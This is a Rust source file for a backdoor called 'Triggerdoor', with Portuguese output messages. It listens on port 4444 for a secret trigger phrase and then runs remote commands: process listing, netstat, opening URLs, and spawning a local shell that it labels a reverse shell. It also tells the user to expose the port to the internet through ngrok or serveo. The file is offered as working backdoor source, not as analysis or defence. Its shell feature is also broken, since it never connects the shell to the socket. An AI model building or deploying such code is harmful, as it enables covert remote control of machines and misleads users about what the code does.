use std::io::{BufRead, BufReader, Write};
use std::net::{TcpListener, TcpStream};
use std::process::{Command, Stdio};

const LISTEN_ADDR: &str = "0.0.0.0:4444";
const TRIGGER: &str = "magicword:mairink";

fn handle_client(mut stream: TcpStream) {
    let peer = stream.peer_addr().unwrap();
    println!("[+] Conexão recebida de {}", peer);

    let mut reader = BufReader::new(stream.try_clone().unwrap());
    let mut buffer = String::new();

    match reader.read_line(&mut buffer) {
        Ok(_) => {
            buffer = buffer.trim().to_string();
            println!("[>] Recebido: {}", buffer);

            if buffer == TRIGGER {
                writeln!(stream, "[+] Trigger correto recebido. Modo interativo ativado...\n").unwrap();

                let mut reader = BufReader::new(stream.try_clone().unwrap());
                loop {
                    buffer.clear();
                    if let Ok(bytes) = reader.read_line(&mut buffer) {
                        if bytes == 0 {
                            break;
                        }
                        let command = buffer.trim();
                        let response = match command {
                            "#open_github" => {
                                Command::new("xdg-open")
                                    .arg("https://github.com/mairinkdev")
                                    .output()
                                    .or_else(|_| Command::new("explorer.exe").arg("https://github.com/mairinkdev").output())
                                    .map(|_| "[+] GitHub aberto.\n".to_string())
                                    .unwrap_or_else(|e| format!("[x] Falha ao abrir GitHub: {}\n", e))
                            }
                            "#open_youtube" => {
                                Command::new("xdg-open")
                                    .arg("https://youtube.com/@mairinkdev")
                                    .output()
                                    .or_else(|_| Command::new("explorer.exe").arg("https://youtube.com/@mairinkdev").output())
                                    .map(|_| "[+] YouTube aberto.\n".to_string())
                                    .unwrap_or_else(|e| format!("[x] Falha ao abrir YouTube: {}\n", e))
                            }
                            "#processes" => {
                                let cmd = if cfg!(target_os = "windows") { "tasklist" } else { "ps" };
                                Command::new(cmd)
                                    .output()
                                    .map(|output| String::from_utf8_lossy(&output.stdout).to_string())
                                    .unwrap_or_else(|e| format!("[x] Erro ao listar processos: {}\n", e))
                            }
                            "#netstat" => {
                                Command::new("netstat")
                                    .arg("-an")
                                    .output()
                                    .map(|output| String::from_utf8_lossy(&output.stdout).to_string())
                                    .unwrap_or_else(|e| format!("[x] Erro ao executar netstat: {}\n", e))
                            }
                            "#reverse_shell" => {
                                let shell = if cfg!(target_os = "windows") { "cmd.exe" } else { "/bin/sh" };
                                let _ = Command::new(shell)
                                    .stdin(Stdio::inherit())
                                    .stdout(Stdio::inherit())
                                    .stderr(Stdio::inherit())
                                    .spawn();
                                "[+] Shell reverso iniciado (herança de IO).\n".to_string()
                            }
                            "#help" => {
                                "Comandos disponíveis:\n\
                                #open_github\n\
                                #open_youtube\n\
                                #processes\n\
                                #netstat\n\
                                #reverse_shell\n\
                                #help\n".to_string()
                            }
                            _ => format!("[x] Comando não reconhecido: {}\n", command),
                        };
                        let _ = stream.write_all(response.as_bytes());
                    }
                }
            } else {
                writeln!(stream, "[x] Trigger incorreto. Encerrando.").unwrap();
            }
        }
        Err(e) => {
            eprintln!("[!] Erro ao ler do cliente: {}", e);
        }
    }
}

fn main() {
    println!("[*] Triggerdoor escutando em {}...", LISTEN_ADDR);
    println!("[*] Use ngrok ou serveo.net para expor a porta para a internet");

    let listener = TcpListener::bind(LISTEN_ADDR).expect("Falha ao iniciar listener");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                std::thread::spawn(|| handle_client(stream));
            }
            Err(e) => {
                eprintln!("[!] Erro de conexão: {}", e);
            }
        }
    }
}
